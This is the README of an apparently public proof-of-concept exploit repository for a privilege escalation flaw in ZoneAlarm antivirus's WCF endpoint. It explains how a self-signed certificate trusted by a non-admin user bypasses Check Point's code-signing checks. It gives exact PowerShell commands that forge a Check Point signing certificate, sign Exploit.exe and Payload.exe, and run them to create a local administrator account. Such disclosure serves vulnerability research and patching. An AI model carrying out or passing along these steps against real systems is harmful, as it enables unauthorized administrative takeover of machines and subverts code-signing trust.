# ZoneAlarmExploit by Illumant

This exploit abuses a WCF service endpoint in ZoneAlarm antivirus by Check Point. The endpoint is meant to be triggered by other Check Point software to launch installation binaries with elevated privileges. 

An attempt to lock down the endpoint was made by checking that any WCF client interacting with the endpoint is running in a process code-signed by Check Point. Matt Graeber pointed out in [this article](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec) that on Windows "non-admin users are able to trust root CA certificates", making it possible to use a self-signed cert to bypass this check. The vulnerable endpoint also checks that the binary it is launching is signed by Check Point, but this can be bypassed in the same manner.

A detailed write-up can be found [here](http://muffsec.com/blog/?p=401).

# Using the Exploit

First install a vulnerable version of ZoneAlarm. Two installation binaries can be found in the "Vulnerable Software" directory of this repository. Either should work, however we have not tested to see if they will autoupdate to a patched version during the installation process. Once the software is installed wait to see that the "SBACipollaSrvHost.exe" service is running. This may take some time even after the install appears to be complete.

The guide for using this exploit is designed for Windows 10 and up. This is because the powershell cmdlets used for working with the self-signed certificate are not available on previous versions of Windows. However, this does not mean that the attack would not work on earlier version.

1. open powershell
2. change directories to the `Release` folder of this repo
3. run the following commands:

        $cert = New-SelfSignedCertificate -certstorelocation cert:\CurrentUser\my -Subject "CN=Check Point Software Technologies Ltd." -Type CodeSigningCert
        Export-Certificate -Type CERT -FilePath fakeCert.cer -Cert $cert
        Import-Certificate -FilePath fakeCert.cer -CertStoreLocation Cert:\CurrentUser\Root\
        Set-AuthenticodeSignature -Certificate $cert -FilePath Exploit.exe
        Set-AuthenticodeSignature -Certificate $cert -FilePath Payload.exe
        .\Exploit.exe

4. run `net localgroup administrators` to see that a new local admin user, `ZoneAlarmExploit`, has been created. 
